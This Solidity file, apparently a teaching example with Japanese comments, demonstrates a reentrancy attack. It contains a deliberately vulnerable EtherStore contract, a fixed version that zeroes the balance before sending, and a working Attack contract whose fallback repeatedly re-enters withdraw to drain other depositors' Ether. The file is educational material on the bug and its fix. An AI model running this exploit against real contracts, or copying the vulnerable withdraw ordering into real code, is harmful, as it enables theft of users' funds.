pragma solidity ^0.8.13;

/*
EtherStoreコントラクトはdepositとwithdraw関数をもつ脆弱性コントラクト

手順
1. Deploy EtherStore
2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into EtherStore
3. Deploy Attack with address of EtherStore
4. Call Attack.attack sending 1 ether (using Account 3 (Eve)).
   You will get 3 Ethers back (2 Ether stolen from Alice and Bob,
   plus 1 Ether sent from this contract).

What happened?
Attack was able to call EtherStore.withdraw multiple times before
EtherStore.withdraw finished executing.

Here is how the functions were called
- Attack.attack
- EtherStore.deposit
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack.fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
*/

import "hardhat/console.sol";

interface IEthereStore {
    function withdraw() external;
    function deposit() payable external;
}

contract vulnerableEtherStore {

    mapping(address => uint)public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool sent,) = msg.sender.call{value: bal}("");
        console.log("call: ", sent);
        require(sent, "failed to send Ether");

        balances[msg.sender] = 0;
    }
}

contract secureEtherStore {

    mapping(address => uint)public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint bal = balances[msg.sender];
        require(bal > 0);

        // 先に残高を減らして対策している。
        balances[msg.sender] = 0;

        (bool sent,) = msg.sender.call{value: bal}("");
        console.log("call: ", sent);
        require(sent, "failed to send Ether");

    }
}

contract Attack {
    IEthereStore public etherStore;

    constructor(address _etherStore) {
        etherStore = IEthereStore(_etherStore);
    }

    fallback() external payable {
        if(address(etherStore).balance >= 1 ether) {
            console.log("fallback called");
            etherStore.withdraw();
        }
    }
    function attack() external payable {
        require(msg.value >= 1 ether);
        console.log("start attacking");
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }
    function getBalance() public view returns(uint) {
        return address(this).balance;
    }
}